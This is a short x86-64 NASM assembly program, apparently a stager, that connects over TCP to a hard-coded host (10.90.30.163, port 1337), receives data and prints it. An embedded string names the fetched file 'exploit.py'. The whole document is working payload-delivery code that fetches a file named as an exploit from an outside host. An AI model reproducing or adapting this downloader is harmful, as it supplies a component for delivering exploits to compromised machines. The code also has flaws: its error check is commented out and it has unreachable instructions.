global _start

struc sockaddr_in
	.sin_family resw 1
	.sin_port resw 1
	.sin_addr resd 1
	.sin_zero resb 8
endstruc

section .bss
	sock resw 2
	client resw 2
	port resw 2
	bytes_read resw 2
	file_buff resb 8092
	file_data resb 8092

section .data
	pop_sa istruc sockaddr_in
		at sockaddr_in.sin_family, dw 2
		at sockaddr_in.sin_port, dw 0x3905
		at sockaddr_in.sin_addr, dd 0xa31e5a0a
		at sockaddr_in.sin_zero, dd 0, 0
	iend
	sockaddr_in_len	equ $ - pop_sa
	

section .text

exit_gracefully:
	xor rax, rax
	add rax, 60
	mov rdi, 1
	syscall

_start:
	mov word [sock], 0
	mov word [client], 0
	mov word [port], 1234
	jmp main

_socket:
	xor rax, rax ;zeroed rax
	mov rax, 41 ;socket syscall no.
	mov rdi, 2 ;AF_INET
	mov rsi, 1 ;SOCK_STREAM
	mov rdx, 0 ;ANY_PROTO
	syscall
	
	;check if call succeeded
	;cmp rax, 0
	;jle _socket_fail
	mov [sock], rax ;save socket fd in sock variable
	
	ret

_connect:
	xor rax, rax
	mov rax, 42
	mov rdi, [sock]
	mov rsi, pop_sa
	mov rdx, sockaddr_in_len
	syscall

	ret

print_data:
	mov rax, 1
	mov rdi, 1
	mov rsi, [file_data]
	mov rdx, 8092
	syscall
	call exit_gracefully

_fcopy:
	mov rax, 45 ; recvfrom syscall no
	mov rdi, [sock] ; socket fd
	lea rsi, [file_buff] ; buffer to copy
	mov [file_data], rsi
	mov rdx, 8092 ; len to copy
	mov r10, 0
	mov r8, 0
	mov r9, 0
	syscall 
	mov [bytes_read], rax	

	jmp print_data

	loop _fcopy	

connect_to_site:
	
	;create socket
	call _socket

	;call connect API
	call _connect
	call _fcopy 

	call exit_gracefully
main:
	call connect_to_site
	siteurl: db '10.90.30.163/exploit.py', 0xa
